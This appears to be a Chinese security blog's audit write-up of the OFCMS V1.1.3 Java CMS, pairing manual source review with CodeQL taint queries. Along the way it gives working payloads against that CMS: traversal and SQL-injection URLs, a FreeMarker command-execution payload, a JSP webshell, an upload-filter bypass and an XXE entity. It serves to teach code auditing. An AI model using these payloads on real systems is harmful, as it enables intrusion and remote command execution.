# 环境搭建

项目地址

https://gitee.com/oufu/ofcms/tree/V1.1.3

这个cms有几年没有维护了，可以拿来练练手，可以直接用项目源码搭建也可以直接部署war包，因为需要审计代码，这里我选址idea——tomcat用源码起环境

![image-20230417094332456](images/1.png)

修改配置文件

![image-20230417095317011](images/2.png)

创建数据库ofcms，这里需要用mysql5

![image-20230417095418712](images/3.png)

![image-20230417095437387](images/4.png)

设置管理员密码

![image-20230417095939845](images/5.png)

重启后还是不行，只有手动构建数据库了

![image-20230417100149965](images/6.png)

将 ofcms-V1.1.3/doc/sql/ofcms-v1.1.3.sql文件手动导入数据库

然后修改ofcms-V1.1.3/ofcms-admin/src/main/resources/dev/conf/db-config.properties文件名修改为db.properties

![image-20230417100619811](images/7.png)

# 前期准备

要审计一个cms，我们首先得明白他的架构

![image-20230417101853358](images/8.png)

可以用tree命令看看整个网站结构，这里太长就不放了，来看看几个包大概的内容

![image-20230417104335736](images/9.png)

admin主要是网站管理

core下存放的是更改java配置的文件，还有一些关于处理器，拦截器，插件的文件

front下是一部分模板文件

整个项目是通过多个maven子项目加上tomcat进行搭建的

MySQL监控工具

https://github.com/TheKingOfDuck/MySQLMonitor

```
java -jar MySQLMonitor.jar -h 127.0.0.1 -user root -pass root
```

![image-20230417110919790](images/10.png)

# 漏洞挖掘

## 目录遍历

这个可以去读到一部分文件，但是只针对与xml和html文件，但是可以去看到整个目录

```
http://localhost:8081/ofcms_admin_war_exploded/admin/cms/template/getTemplates.html?file_name=web.xml&dir=../../&dir_name=default
```

![image-20230417154037689](images/11.png)

相应代码定位到com.ofsoft.cms.admin.controller.cms/TemplateController

```
public void getTemplates() {
    //当前目录
    String dirName = getPara("dir","");
    //上级目录
    String upDirName = getPara("up_dir","/");
    //类型区分
        String resPath = getPara("res_path");
    //文件目录
    String dir = null;
    if(!"/".equals(upDirName)){
          dir = upDirName+dirName;
    }else{
          dir = dirName;
    }
    File pathFile = null;
    if("res".equals(resPath)){
        pathFile = new File(SystemUtile.getSiteTemplateResourcePath(),dir);
    }else {
        pathFile = new File(SystemUtile.getSiteTemplatePath(),dir);
    }

    File[] dirs = pathFile.listFiles(new FileFilter() {
        @Override
        public boolean accept(File file) {
            return file.isDirectory();
        }
    });
    if(StringUtils.isBlank (dirName)){
        upDirName = upDirName.substring(upDirName.indexOf("/"),upDirName.lastIndexOf("/"));
    }
    setAttr("up_dir_name",upDirName);
    setAttr("up_dir","".equals(dir)?"/":dir);
    setAttr("dir_name",dirName.equals("")?SystemUtile.getSiteTemplatePathName():dirName);
    setAttr("dirs", dirs);
    /*if (dirName != null) {
        pathFile = new File(pathFile, dirName);
    }*/
    File[] files = pathFile.listFiles(new FileFilter() {
        @Override
        public boolean accept(File file) {
            return !file.isDirectory() && (file.getName().endsWith(".html") || file.getName().endsWith(".xml")
                    || file.getName().endsWith(".css") || file.getName().endsWith(".js"));
        }
    });
    setAttr("files", files);
    String fileName = getPara("file_name", "index.html");
    File editFile = null;
    if (fileName != null && files != null && files.length > 0) {
        for (File f : files) {
            if (fileName.equals(f.getName())) {
                editFile = f;
                break;
            }
        }
        if (editFile == null) {
            editFile = files[0];
            fileName = editFile.getName();
        }
    }

    setAttr("file_name", fileName);
    if (editFile != null) {
        String fileContent = FileUtils.readString(editFile);
        if (fileContent != null) {
            fileContent = fileContent.replace("<", "&lt;").replace(">", "&gt;");
            setAttr("file_content", fileContent);
            setAttr("file_path", editFile);
        }
    }
    if("res".equals(resPath)) {
        render("/admin/cms/template/resource.html");
    }else{
    render("/admin/cms/template/index.html");
    }
}
```

首先获取dir和up_dir，还有res_path三个参数，通过new file得到一个filepath

```
if("res".equals(resPath)){
    pathFile = new File(SystemUtile.getSiteTemplateResourcePath(),dir);
}else {
    pathFile = new File(SystemUtile.getSiteTemplatePath(),dir);
}
```

因为我们没有传入res参数所以进到else分支

![image-20230417201759056](images/12.png)

![image-20230417201820690](images/13.png)

![image-20230417203014133](images/14.png)

pathFile是实例化的一个File对象，里面拼接了getSiteTemplatePath对象和传入的dir参数，dir参数没有做限制，这样我们可以拼接目录穿越符

通过把路径下的文件和目录列出来

```
File[] dirs = pathFile.listFiles(new FileFilter() {
        @Override
        public boolean accept(File file) {
            return file.isDirectory();
        }
    });
```

然后就是通过目录列文件，但是这里写明了filter，获取的文件后缀只能是html、xml、css、js

```
File[] files = pathFile.listFiles(new FileFilter() {
    @Override
    public boolean accept(File file) {
        return !file.isDirectory() && (file.getName().endsWith(".html") || file.getName().endsWith(".xml")
                || file.getName().endsWith(".css") || file.getName().endsWith(".js"));
    }
});
```

后面就是通过filename遍历获取文件然后渲染到index.html中

## SQL注入

跟着看了后，几乎所有的sql语句都采用了占位符这种预编译的方式

![image-20230418111331737](images/15.png)

不过这里我们可以自己定义sql语句，这样就可以不用采用占位符的方式

![image-20230418111741161](images/16.png)

定位代码，这里我们去找到system/generate路由，`com.ofsoft.cms.admin.controller.system.SystemGenerateController`

![image-20230418111905962](images/17.png)

根据注释我们定位到了create方法

![image-20230418111939235](images/18.png)

传入的参数也是这里的sql

![image-20230418112025608](images/19.png)

```
public String getPara(String name) {
    return this.request.getParameter(name);
}
```

可以看到并没有对传入的sql做任何处理

一路跟到了这里的update方法，虽然这里fillStatement会去采用占位符填充的方式，但是我的sql语句并没有才用占位符

![image-20230418112109018](images/20.png)

我们直接来访问create方法

```
http://localhost:8081/ofcms_admin_war_exploded/admin/system/generate/create?sql=
```

![image-20230418112952414](images/21.png)

抛出了异常，只能用update方法，既然有报错回显那就试试报错注入

```
http://localhost:8081/ofcms_admin_war_exploded/admin/system/generate/create?sql=update of_cms_ad set ad_id=updatexml(1,concat(0x7e,(select database()),0x7e),1)
```

![image-20230418135502551](images/22.png)



## 模板注入

在项目的pom.xml中发现了freemarker模板引擎，我们回到编辑模板的地方

![image-20230418143620906](images/23.png)

![image-20230418144449028](images/24.png)

可以看到对应的路由com/template/save方法，甚至还有我电脑上该文件的全路径，定位到TemplateController的save方法

![image-20230418144656164](images/25.png)

就是将内容写入，并且把实体编码替换为了<，防止一些html标签不起作用，其实没有对写入的参数做任何过滤，可以直接把模板的payload写入到模板文件中

payload

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }
```

![image-20230418144134688](images/26.png)

![image-20230418144148081](images/27.png)

执行了命令

另外这里没有过滤标签之类的，是有一个存储型xss的

![image-20230418150414997](images/28.png)

但是这里可能是后端设置cookie的时候，有个httponly为true，可以防止前端盗用cookie，所以document.cookie获取不到

## 任意文件写入

还是保存模板的地方

![image-20230418154246896](images/29.png)

我们可以提交多个参数，最终的file对象是res_path拼接上file_name，但是对于file_name的值没有做一个过滤，导致可以用目录穿越符写到其他目录里面去，而且文本内容是我们可控的，那就相当于可以写入任意文件

抓包

![image-20230418154021656](images/30.png)

写入成功

![image-20230418154007978](images/31.png)

来写一个jsp，把他写到静态资源目录下

![image-20230418161144880](images/32.png)

![image-20230418161155412](images/33.png)



通过URL写进去，这里就写一个最简单的jsp，也可以直接写冰蝎马

```
<%
    if("DawnT0wn".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>

```

![image-20230418161419234](images/34.png)

## 文件上传

在内容管理处，找到了上传文件的地方

![image-20230418163343219](images/35.png)

传一个jsp看到前端没有验证，抓包

![image-20230418163406855](images/36.png)

上传失败，定位到comn/service路由的upload方法

![image-20230418163440512](images/37.png)

通过传入的file名在/upload/image目录下寻找文件，没有找到就createNewFile，传jsp的时候在这里报错了file空指针异常，跟进一下getFile

![image-20230418164733531](images/38.png)

调用了两次getFiles方法，先跟进第一次

![image-20230418164814647](images/39.png)

此时的request是ShiroHttpServletRequest，进入了if，实例化了MultipartRequest返回给request

![image-20230418164924489](images/40.png)

跟进wrapMultipartRequest

![image-20230418165011423](images/41.png)

首先还是判断了在上传目录下文件是否存在

![image-20230418165557528](images/42.png)

接下来就是获取文件名和文件类型，实例化UploadFile为参数赋值

![image-20230418165716721](images/43.png)

接下来调用isSafeFile判断

![image-20230418165743228](images/44.png)

在这里我们看到了后缀名的检测，不能说jsp和jspx，虽然转化了大小写，但是并不是截取filename的结尾再正则匹配，我们通过一些解析漏洞是可以绕过的，绕过通过nginx反向代理部署过的话，有可能能用到nginx的解析漏洞，这里其实也可以用到windows队文件后缀名解析的特性进行绕过，加上一个点

![image-20230418170453035](images/45.png)

就上传成功了，但是我这里的系统是MacOS就没成功，这个漏洞就只针对于windows和一些带解析漏洞的中间件了

其实还有一些其他上传接口也是这样，比如ComnController的editUploadImage方法，UeditorAction的uploadImage和uploadFile，以及uploadVideo和uploadScrawl的上传逻辑都是一样的

## XXE（鸡肋）

除了根据前端来定位路由之外，对于其他的一些controller也需要我们去审查，也有可能出现问题

```
com.ofsoft.cms.admin.controller.ReprotAction的expReport方法
```

![image-20230419155326873](images/46.png)

首先是获取response对象，getParmsMap是把我们提交的参数和值放入Map对象，再通过get取出键值，也就是传入的参数值，和之前一样没有过滤，可以穿越目录，不过限制了后缀未jrxml，但是在complieReport方法调用的时候，如果没有找到文件，FileInputStream会报错，找到了的话调用compileReport

![image-20230419155924005](images/47.png)

调用了JRXmlLoader的load，一路跟到JRXmlLoader的loadXML方法

![image-20230419160224481](images/48.png)

在loadXML方法中调用了Digester类的parse解析我们的XML文档内容，默认是没有禁用外部实体解析的，所以这里是存在XXE漏洞的

这个就需要配合一个已有的jrxml文件使用了，可以用之前任意文件写入或者文件上传来上传一个jrxml，因为文件上传是除了jsp和jspx后缀的都可以上传

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1:7777"> %xxe; ]>
```

```
http://localhost:8080/ofcms_admin/admin/reprot/expReport.html?j=../../upload/image/1
```

![image-20230419162633884](images/49.png)

因为正常的情况下，这里我们没法控制，所以感觉有一点鸡肋

## 存储型xss

前面提到过，在编辑模板的时候可以有存储型的xss，这里的xss就很多了，网上都写到了前台评论处存在xss

![image-20230418171218016](images/50.png)

根据抓包的接口定位到了com.ofsoft.cms.api.v1的CommentApi的save方法

![image-20230418171724263](images/51.png)

因为没有对传入的参数处理就传入了数据库造成的存储型的xss

其实这里的写法在后台的编辑处，基本上所有与数据库相关的都是这样，虽然才用了占位符，但是传入数据库的xss脚本还是没有进行处理，站点设置的备注，里面也可以打入一个xss

![image-20230418172010144](images/52.png)

定位到com.ofsoft.cms.admin.controller.cms的SiteController的update方法

![image-20230418172307186](images/53.png)

![image-20230418172436553](images/54.png)

可以看到虽然才用了预编译的方式，但是并没有xss的处理，也就是说，这个所有的update方法只要能插入xss的都可以去做到一个存储型的xss

当然，前台评论的危害肯定会更大

# CodeQL辅助审计

构建数据库

```
codeql database create ofcms_demo  --language="java"  --command="mvn clean package -DskipTests" --source-root=/Users/DawnT0wn/java/ofcms-V1.1.3
```

对于cms的审计，我们依然是定义source和sink点寻找可达路径

## Source

对于CodeQL中的source点，我们可能会关注到一些Controller的处理逻辑，但是我们要对漏洞利用的话，永远都是要我们可控的一些参数，所以我们应该把source点放在一些参数请求的点上面来，比如http请求参数，http请求头

我们通过观察Controller后发现，基本上所有的参数获取都是通过getXXX来获取的，网上根据的是BaseController和ApiBase，以及Controller三个类展开的，里面写到了一些getter方法，但是通过观察可以发现，这三个类其实有一个共性，那就是继承类Controller，除了本来项目写到的Controller，有一部分的参数还需要用到httpServlet的getter方法，所以我们可以这样去定义我们的source

```
class OfCmsSource extends MethodAccess{
    OfCmsSource(){
        (this.getMethod().getDeclaringType*().getASupertype*().hasQualifiedName("com.jfinal.core", "Controller") and
        this.getMethod().getName().substring(0, 3) = "get")
        or 
        (this.getMethod().getDeclaringType*().getASupertype*().hasQualifiedName("javax.servlet.http", "HttpServletRequest") and (this.getMethod().getName().substring(0, 3) = "get"))

    }
}
```

效果和网上给的source点是一样的

```
class OfCmsSource extends MethodAccess{
    OfCmsSource(){
        (this.getMethod().getDeclaringType*().hasQualifiedName("com.ofsoft.cms.admin.controller", "BaseController") and
        (this.getMethod().getName().substring(0, 3) = "get"))
        or 
        (this.getMethod().getDeclaringType*().hasQualifiedName("com.jfinal.core", "Controller") and
        (this.getMethod().getName().substring(0, 3) = "get"))
        or 
        (this.getMethod().getDeclaringType*().hasQualifiedName("javax.servlet.http", "HttpServletRequest") and (this.getMethod().getName().substring(0, 3) = "get"))
        or
        (this.getMethod().getDeclaringType*().hasQualifiedName("com.ofsoft.cms.api", "ApiBase") and
        (this.getMethod().getName().substring(0, 3) = "get"))
    }
}
```

## Sink

对于sink点的定义就需要根据不同类型的漏洞去寻找了

### 模板渲染

这里的模板渲染的话，没有找出来save那一个点，save那个点是因为我们可以去控制模板文件，将模板文件保存后再访问才能够触发的模板注入，所以这里直接用CodeQL并不好实现，但是可以找到很多有关模板渲染的点，如果可以实现一个上传任意文件的话，也可以达到一个模板注入的情况，不过文件必须放在模板目录下

ofcms使用了Jfinal框架，Jfinal中对模版渲染有一系列的render方法：

![image-20230424153834153](images/55.png)

都是以render开头的，我们可以随便找一个地方的render方法，可以发现是Controller类的render方法

```
class RenderMethod extends MethodAccess{
    RenderMethod(){
        (this.getMethod().getDeclaringType*().getASupertype*().hasQualifiedName("com.jfinal.core", "Controller") and
        this.getMethod().getName().substring(0, 4) = "rend") or
        (this.getMethod().getDeclaringType*().getASupertype*().hasQualifiedName("com.ofsoft.cms.core.plugin.freemarker", "TempleteUtile") and
        this.getMethod().hasName("process"))
    }
}
```

我们可以随时添加认为可能的类到ql中，因为TempleteUtile中的process的第一个参数可控的话也可以去造成模板注入

![image-20230424154229730](images/56.png)

剩下的就是需要我们去审计跟踪，查看误报了

![image-20230424154618065](images/57.png)

![image-20230424155231072](images/58.png)

不过我看了几个地方，根目录最多到page目录下，就不能再往上跳了，也不能跳到upload目录去

### 文件类问题

在java中，有关于文件方面的问题我们一半用到的是`java.io#file`

```
class FileContruct extends ClassInstanceExpr{
    FileContruct(){
        this.getConstructor().getDeclaringType*().hasQualifiedName("java.io", "File")
    }
}
```

![image-20230424155732096](images/59.png)

可以看到，这个只能定位到File操作的地方，但是我们之前任意文件写入，目录遍历，xxe方面的漏洞基本上都展示出来了，只不过后面的一部分需要我们自己审计，而不是直接找到的漏洞点，其实XXE也可以去找到loadXML函数，只不过要去包含到所有能解析xml的函数，个人觉得不如这样找到文件操作的类，再去审计

不过这里对于文件上传的点并没有找到

### SQL注入

我们可以看到，所有有关数据库的操作都调用了com.jfinal.plugin.activerecord包下Db这个类，无论是获取sql语句，还是查询，然后具体的实现在DbPro这个类，所以说，对于哪里与数据库有交互的话，我们可以定位到Db这个类，但是当我们直接限定这个的时候，得到了很多结果，因为ofcms对于sql语句的获取做了预编译的处理，通过getSql和getSqlPara获取到的sql语句是通过占位符的，所以我们在查找方法的时候可以把它过滤掉

```
class SqlMethod extends MethodAccess{
    SqlMethod(){
        this.getMethod().getDeclaringType*().getASupertype*().hasQualifiedName("com.jfinal.plugin.activerecord", "Db") and
        not this.getMethod().getName().substring(0,3)="get"
    }
}
```

其实平常写的话，根据实际情况还过可以过滤掉一些无关的内容，比如说去过滤掉是通过getSql等方法获取的语句传入update中的地方，例如

![image-20230424170703909](images/60.png)

这样虽然会少了一个Db.getSqlPara的点，但是对于这种没有用的update还是会是误报，这种我们可以用黑名单的方式

先贴关键代码，所有的代码会在最后贴

```
class SqlMethod extends MethodAccess{
    SqlMethod(){
        this.getMethod().getDeclaringType*().getASupertype*().hasQualifiedName("com.jfinal.plugin.activerecord", "Db") and
        not this.getMethod().getName().substring(0,3)="get"
    }
}

class BlackMap extends MethodAccess{
    BlackMap(){
        exists(RefType cls | this.getMethod().getDeclaringType() = cls and
        this.getMethod().hasName([
        "getSql",
        "getSqlPara"]) )
    }
}

override predicate isSink(DataFlow::Node sink) {
        // exists(RenderMethod render |sink.asExpr() = render.getAnArgument() )
        // exists(FileContruct rawOutput | sink.asExpr() = rawOutput.getAnArgument() )
        exists(SqlMethod sql,BlackMap black| sink.asExpr() = sql.getAnArgument() and not sink.asExpr() = black.getAnArgument())
    }
```

![image-20230424172912597](images/61.png)

这样就只找到26个结果了，没有了有关getSql这两个方法的地方

不过对于直接获取了再传入的sql语句，还是没有过滤，但是对于把getSql方法写到update里面这种情况已经去除了

![image-20230424173148101](images/62.png)

最后我把这26个结果翻看完了，发现只有上面自己传入一个sql语句才没有使用预编译，其他都采用了一个占位符的方式

### Jndi

```
class LookupMethod extends MethodAccess{
    LookupMethod(){
        this.getMethod().getDeclaringType*().getASupertype*().hasQualifiedName("javax.naming", "Context") and
        this.getMethod().hasName("lookup")
    }
}
```

对于jndi的点本来想去寻找，但是根本没有lookup

![image-20230424173841445](images/63.png)

初次之外还可以去查看一些有没有readObject的地方，以及反射等



最后代码

```
/**
 * @kind path-problem
 */
import java
import semmle.code.java.dataflow.FlowSources
import semmle.code.java.security.QueryInjection
import DataFlow::PathGraph

class OfCmsSource extends MethodAccess{
    OfCmsSource(){
        (this.getMethod().getDeclaringType*().getASupertype*().hasQualifiedName("com.jfinal.core", "Controller") and
        this.getMethod().getName().substring(0, 3) = "get")
        or 
        (this.getMethod().getDeclaringType*().getASupertype*().hasQualifiedName("javax.servlet.http", "HttpServletRequest") and (this.getMethod().getName().substring(0, 3) = "get"))

    }
}

class RenderMethod extends MethodAccess{
    RenderMethod(){
        (this.getMethod().getDeclaringType*().getASupertype*().hasQualifiedName("com.jfinal.core", "Controller") and
        this.getMethod().getName().substring(0, 6) = "render") or
        (this.getMethod().getDeclaringType*().getASupertype*().hasQualifiedName("com.ofsoft.cms.core.plugin.freemarker", "TempleteUtile") and
        this.getMethod().hasName("process"))
    }
}

class FileContruct extends ClassInstanceExpr{
    FileContruct(){
        this.getConstructor().getDeclaringType*().hasQualifiedName("java.io", "File")
    }
}

class ServletOutput extends MethodAccess{
    ServletOutput(){
        this.getMethod().getDeclaringType*().hasQualifiedName("java.io", "PrintWriter")
    }
}

class SqlMethod extends MethodAccess{
    SqlMethod(){
        this.getMethod().getDeclaringType*().getASupertype*().hasQualifiedName("com.jfinal.plugin.activerecord", "Db") and
        not this.getMethod().getName().substring(0,3)="get"
    }
}

class BlackMap extends MethodAccess{
    BlackMap(){
        exists(RefType cls | this.getMethod().getDeclaringType() = cls and
        this.getMethod().hasName([
        "getSql",
        "getSqlPara"]) )
    }
}


class OfCmsTaint extends TaintTracking::Configuration {

    OfCmsTaint() { 
        this = "OfCmsTaint" 
    }
    
    override predicate isSource(DataFlow::Node source) {
        source.asExpr() instanceof OfCmsSource
    }
    
    override predicate isSink(DataFlow::Node sink) {
        // exists(RenderMethod render |sink.asExpr() = render.getAnArgument() )
        // exists(FileContruct rawOutput | sink.asExpr() = rawOutput.getAnArgument() )
        exists(SqlMethod sql,BlackMap black| sink.asExpr() = sql.getAnArgument() and not sink.asExpr() = black.getAnArgument())
    }
}

// from DataFlow::Node source,DataFlow::Node sink,OfCmsTaint config
// where config.hasFlowPath(source, sink)
from OfCmsTaint config,DataFlow::PathNode source,DataFlow::PathNode sink
where config.hasFlowPath(source, sink)
select sink.getNode(),source,sink,"ofcms"
```



# 写在最后

这次对java的cms的黑白盒结合审计，一些路由方面有了相应的了解，以及结合CodeQL对一些sink点的查找，利用污点追踪的方式，当然也可以使用edges谓词，source点就用相应的传参，去找到哪里可以接受我们可控的参数，sink点就是对应漏洞的特征了



参考链接：

https://blog.51cto.com/u_15878568/5955407

https://www.secpulse.com/archives/185233.html

https://blog.csdn.net/YouthBelief/article/details/122978328

https://www.anquanke.com/post/id/203674#h2-9
